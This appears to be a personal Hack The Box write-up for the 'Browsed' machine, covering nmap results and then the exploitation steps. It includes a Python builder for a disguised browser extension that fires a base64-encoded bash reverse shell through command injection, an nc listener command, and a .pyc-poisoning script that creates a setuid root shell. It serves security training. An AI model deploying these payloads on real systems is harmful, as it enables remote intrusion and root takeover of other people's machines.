### Nmap
```
nmap -sV -sC -vv 10.129.244.79

---OUTPUT---
Nmap scan report for browsed.htb (10.129.244.79)
Host is up, received echo-reply ttl 63 (0.015s latency).
Scanned at 2026-02-18 08:22:19 EST for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJW1WZr+zu8O38glENl+84Zw9+Dw/pm4IxFauRRJ+eAFkuODRBg+5J92dT0p/BZLMz1wZMjd6BLjAkB1LHDAjqQ=
|   256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICE6UoMGXZk41AvU+J2++RYnxElAD3KNSjatTdCeEa1R
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Port 80
![[Pasted image 20260218082519.png]]

- There are some sample zip files I can download. Furthermore I can upload extension. For a test I uploaded an extension from the sample download. The output pointed to a url `browsedinternals.htb` 
- On accessing the site I see its a gitea website.
![[Pasted image 20260218110849.png]]

- There is a markdown preview repo:
![[Pasted image 20260218110919.png]]
- The description states `This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!`. 
- in the app.py we see it converts the entire content without sanitization to html. this can lead to a stored XSS attack (`html = markdown.markdown(content)`
- also in main we know it goes for `127.0.0.1:5000`

- Now we know the way the extension is made (zip sample files we downloaded) and we know that the content loaded is converted to html. We 
- Can upload an extension. Can use this code to build the exploit and upload to grab a shell:
```
import zipfile
import io
import base64

def create_shell_extension(my_ip, my_port="9999"):
    zip_buffer = io.BytesIO()
   
    # 1. The Reverse Shell One-Liner (Standard Bash)
    # We encode it to avoid breaking the JSON or the URL string
    raw_shell = f"bash -i >& /dev/tcp/{my_ip}/{my_port} 0>&1"
    b64_shell = base64.b64encode(raw_shell.encode()).decode()
   
    # This is the payload that will be executed on the server
    # It decodes itself and pipes into bash
    shell_payload = f"echo${{IFS}}{b64_shell}|base64${{IFS}}-d|bash"

    # 2. Manifest V3
    manifest = '''{
        "manifest_version": 3,
        "name": "Security Optimizer",
        "version": "1.1",
        "background": {
            "service_worker": "background.js"
        },
        "host_permissions": ["*://127.0.0.1/*", "*://localhost/*"]
    }'''

    # 3. background.js
    # We will try both the routine path and a potential root injection
    background = f'''
    const ip = "{my_ip}";
    const payload = "{shell_payload}";
   
    // We send it via a background loop to ensure it fires
    async function triggerShell() {{
        const urls = [
            `http://127.0.0.1:5000/routines/a[$(${{payload}})]`,
            `http://127.0.0.1:5000/routines/a';${{payload}} #`
        ];

        for (const url of urls) {{
            fetch(url, {{ mode: 'no-cors' }});
        }}
    }}

    triggerShell();
    '''

    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("manifest.json", manifest)
        zip_file.writestr("background.js", background)

    with open("shell_exploit.zip", "wb") as f:
        f.write(zip_buffer.getvalue())

    print(f"[+] shell_exploit.zip created.")
    print(f"[+] Listener command: nc -lvnp {my_port}")
    print(f"[+] Encoded payload: {shell_payload}")

if __name__ == "__main__":
    # Change this to your HTB Tun0 IP
    create_shell_extension("10.10.16.26", "9999")
```
![[Pasted image 20260218094942.png]]
- I grab user flag:
![[Pasted image 20260218095011.png]]


## Privilege Escalation
- sudo privileges show a command we can pass as root:
![[Pasted image 20260218095048.png]]

- can use this exploit.py (in /tmp/exploit.py):
```
import os
import py_compile
import shutil
import sys

ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
# Fixed the path to __pycache__ based on your previous 'ls'
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

# The payload that will execute as root
payload = 'import os\ndef validate_manifest(path): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\ndef clean_temp_files(arg): pass\n'

# Padding with comments to match the exact size of the original file
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# Sync timestamps
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# Compile
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")

# Inject
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/malicious.pyc", TARGET_PYC)
print("[+] Poisoned .pyc injected successfully")
```

- Then we pass the following commands:
```
python3 /tmp/exploit.py
sudo /opt/extensiontool/extension_tool.py --ext Fontify
/tmp/rootbash -p
```
![[Pasted image 20260218095343.png]]

- I grab root flag:
![[Pasted image 20260218095437.png]]